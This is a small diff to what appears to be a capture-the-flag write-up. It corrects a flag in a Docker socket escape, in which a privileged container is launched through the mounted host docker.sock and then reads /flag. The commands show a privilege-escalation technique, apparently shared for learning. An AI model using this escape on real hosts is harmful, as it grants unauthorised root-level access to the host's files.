@@ -491,7 +491,7 @@ cat /flag
 
 ```sh
 sudo docker run --rm --security-opt=no-new-privileges -u 1000:1000 --group-add 103 -it -v /var/run/docker.sock:/var/run/docker.sock:rw -v /usr/bin/docker:/usr/bin/docker alpine
-docker run -it --rm --group-add 0 --group-add 6 --privileged -c /flag:/flag alpine
+docker run -it --rm --group-add 0 --group-add 6 --privileged -v /flag:/flag alpine
 cat /flag
 ```
 
